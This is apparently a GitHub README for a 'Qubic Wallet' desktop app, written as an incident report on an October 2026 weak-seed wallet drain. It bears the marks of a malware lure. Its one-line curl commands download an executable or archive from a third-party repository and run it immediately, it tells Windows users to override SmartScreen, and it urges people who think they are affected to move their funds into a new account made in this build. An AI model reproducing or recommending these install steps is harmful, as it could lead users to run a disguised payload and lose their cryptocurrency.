![October 2026 Qubic weak seed incident](assets/banner-trust.png)

# The October 2026 Qubic Weak-Seed Incident: Desktop Wallet Impact

1,404 wallets, about 2.94 trillion QU, and one generation flaw in a browser.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macos"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

Impact statements come from the published incident summary and are read against the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2).

> The flaw was in how some seeds were made, not in how they were stored afterward.

In October 2026, 1,404 Qubic wallets were drained of roughly 2.94 trillion QU through weak seed randomness. The window was narrow - from 23:42 UTC on 17 October to about 01:26 UTC on 18 October 2026 - and the cause was seeds generated with insufficient randomness in certain clients. The affected list named browser-based generation on iPhone and iPad before 18 October 2026, Safari on Mac before the same date, and the Qubic iOS app before July 2025. No desktop build was named.

<!-- ARTICLE-BODY-BEGIN -->

## What happened, in order

| Time | Event |
| --- | --- |
| Before 18 Oct 2026 | Seeds created in affected browser and iOS contexts carry weak randomness |
| 23:42 UTC, 17 Oct | Drainage begins |
| 01:26 UTC, 18 Oct | Drainage ends, with 1,404 wallets emptied |
| 18-19 Oct | The project publishes the cause and scope; the web wallet is fixed in 4.26.4 |

## Who was affected

Seeds generated in a browser on iPhone or iPad before 18 October 2026, in Safari on Mac before that date, or in the Qubic iOS app before July 2025. Those conditions describe the generation context, not the wallet you use today.

## Who was not

No desktop build appears in the affected list, and this desktop wallet did not generate seeds in the affected contexts. That is a statement about the published scope, not a claim that any particular machine was safe: a seed imported into the desktop app from an affected source keeps the weakness of its origin.

## What to do if you think you are in scope

Create a fresh account in the desktop build and move the funds to it, then retire the old seed. A new seed from a local generator is the only fix; changing the password does not regenerate anything.

Do the move on a verified install, which the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md">download check</a> covers.

Read the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-seed-phrase-format.md">seed format guide</a> before writing the new phrase down.

## The lesson that outlives the incident

Randomness quality is invisible until it fails. Two seeds can look identical and be worlds apart in strength, which is why the generation environment matters as much as the storage. Use the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> and generate locally.

## FAQ

### Was the desktop wallet affected?

No desktop build was named in the affected list.

### Was my seed affected if I created it in the browser?

If it was created in one of the named contexts before the cutoff, treat it as compromised and move the funds.

### Is the web wallet fixed?

The published fix is version 4.26.4. Check the version you are using rather than assuming.

### Does changing my password help?

No. The weakness is in the seed, and the password does not regenerate one.

### How do I know if a seed is strong?

You cannot, by looking at it. Use a generator that was not implicated and create the account locally.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Seed phrase formats](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-seed-phrase-format.md)
- [Download and verify the installer](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md)
- [Is Qubic Wallet safe](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/is-qubic-wallet-safe.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
